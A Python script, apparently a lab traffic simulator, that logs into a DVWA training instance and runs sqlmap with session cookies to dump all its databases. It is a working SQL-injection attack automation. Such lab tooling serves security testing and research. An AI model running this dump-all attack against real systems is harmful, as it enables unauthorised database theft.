import argparse
import time
import requests
import numpy as np
import logging
import subprocess

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from pyvirtualdisplay import Display




logging.basicConfig(level=logging.DEBUG)

parser = argparse.ArgumentParser(description='HTTPS-Client Simulation.')

parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                    help='The IP address of the target server')
parser.add_argument('-u', dest='username', action='store', type=str, required=True, help='The username of the client')
parser.add_argument('-p', dest='password', action='store', type=str, required=True, help='The password of the client')

args = parser.parse_args()

# Disable requests warnings (caused by self signed server certificate)
requests.packages.urllib3.disable_warnings()

# Virtual display to run chrome-browser
display = Display(visible=0, size=(800, 800))
display.start()

# Headless chrome-browser settings	
chrome_options = Options()
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument('--ignore-certificate-errors')
browser = webdriver.Chrome(chrome_options=chrome_options)

# states:
logged_off = 0
logged_in = 1

# initially the client is logged off
client_state = logged_off


def wait_for_dvwa():
    done = False
    logging.info('wait till dvwa is up und running...')
    while not done:
        # wait till dvwa is up und running
        url = 'http://' + args.server_ip + '/login.php'
        browser.get(url)
        if 'Login :: Damn Vulnerable Web Application' in browser.title:
            done = True
            logging.info('dvwa is ready...')
        else:
            logging.info('dvwa not ready yet, waiting 2 seconds, current title: \n' + browser.title)
            time.sleep(2)


def start_attack():
    """
    main loop of attack behaviour
    """
    wait_for_dvwa()

    # first log in
    log_in()

    target_link = 0
    # navigate to sql injection form
    for link in browser.find_elements_by_xpath('.//a'):
        if 'vulnerabilities/sqli/' in link.get_attribute('href'):
            target_link = link
            break
    target_link.click()
    url = browser.current_url

    #url = 'http://' + args.server_ip + '/vulnerabilities/sqli/'
    #browser.get(url)
    logging.info(' successful got sqli page: %s', url)

    # get cookie values
    cookie = "--cookie="
    for ck in browser.get_cookies():
        logging.info(ck['name'] + " " + ck['value'])
        cookie = cookie + ck['name'] + "=" + ck['value'] + "; "
    cookie = cookie[:-2]
    cookie = cookie + ""

    logging.info(' read cookie vaules: %s', cookie)

    # call sqlmap in batch mode and waiting for it to finish
    # python2.7 /home/sqlmapproject/sqlmap.py --cookie="security=low; PHPSESSID=8orboiptrr5ca1ifs4fi6oe642" -u 'http://172.17.0.3/vulnerabilities/sqli/?id=1&Submit=Submit#' --dump-all --exclude-sysdbs --batch --fresh-queries


    subprocess_params = ['python2.7', '/home/sqlmapproject/sqlmap.py', cookie, '-u', url + '?id=1&Submit=Submit', '--dump-all', '--exclude-sysdbs', '--batch']
    subprocess_params_str = ""
    for s in subprocess_params:
        subprocess_params_str = subprocess_params_str + s + ' '

    logging.info(' now calling subprocess: %s', subprocess_params_str)
    subprocess.call(subprocess_params)

    log_off()



def log_in():
    """
    logs into dvwa with the given username and password (args.username and args.password)
    changes client_state to logged_in
    """
    global client_state
    url = 'http://' + args.server_ip + '/login.php'
    logging.info('login... ' + url)
    browser.get(url)
    logging.info('    got response')
    browser.find_element_by_name('username').send_keys(args.username)
    browser.find_element_by_name('password').send_keys(args.password)
    logging.info('    filled form and click')
    browser.find_element_by_name('Login').click()
    logging.info('    logged in')
    client_state = logged_in


def log_off():
    """
    logs the current user out from dvwa
    changes client_state to logged_off
    """
    global client_state
    logging.info('logout...')
    browser.find_element_by_link_text('Logout').click()
    logging.info('    logged out')
    client_state = logged_off


start_attack()
